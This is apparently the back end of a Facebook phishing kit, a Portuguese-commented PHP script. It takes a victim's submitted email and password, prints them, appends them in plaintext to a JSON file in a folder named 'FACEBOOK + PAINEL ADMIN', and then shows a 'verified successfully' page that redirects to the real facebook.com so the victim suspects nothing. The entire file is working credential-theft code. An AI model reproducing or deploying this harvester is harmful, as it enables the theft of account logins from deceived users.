<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Definindo variáveis para email e senha
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    echo "Email: " . $email . "<br>";
    echo "Senha: " . $senha . "<br>";

    // Verificar se os dados foram recebidos corretamente
    if ($email && $senha) {
        // Caminho absoluto do arquivo JSON (ajustado para considerar espaços)
        $fl = "/home/souza/Downloads/FACEBOOK + PAINEL ADMIN/operador/seguro/boleto1.json";
        
        // Verificar se o arquivo existe
        if (file_exists($fl)) {
            // Abrir o arquivo JSON para leitura
            $h = fopen($fl, "r");
            $arr = json_decode(fread($h, filesize($fl)), true);  // 'true' para retornar um array associativo
            fclose($h);
        } else {
            // Caso o arquivo não exista, criar um array vazio
            $arr = [];
        }

        // Adicionar o novo email e senha ao array
        array_push($arr, array("email" => $email, "senha" => $senha));

        // Gravar no arquivo JSON
        $fhs = fopen($fl, 'w') or die("Can't open file");
        fwrite($fhs, json_encode($arr, JSON_PRETTY_PRINT));
        fclose($fhs);

        // Exemplo de resposta
        echo "Dados recebidos e salvos!";
    } else {
        echo "Erro: dados não recebidos corretamente.";
    }
}
?>

<!DOCTYPE html>
<html>
<head> 
  <title>Verificado com sucesso </title> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no"> 
  <meta http-equiv="refresh" content="2;url='https://www.facebook.com/site'"> 
  <link rel="shortcut icon" href="assets/imagenss/ico_favicon.png"> 
  <link rel="stylesheet" type="text/css" href="../assets/css/benef_compras_style.css"> 
</head>
</html>
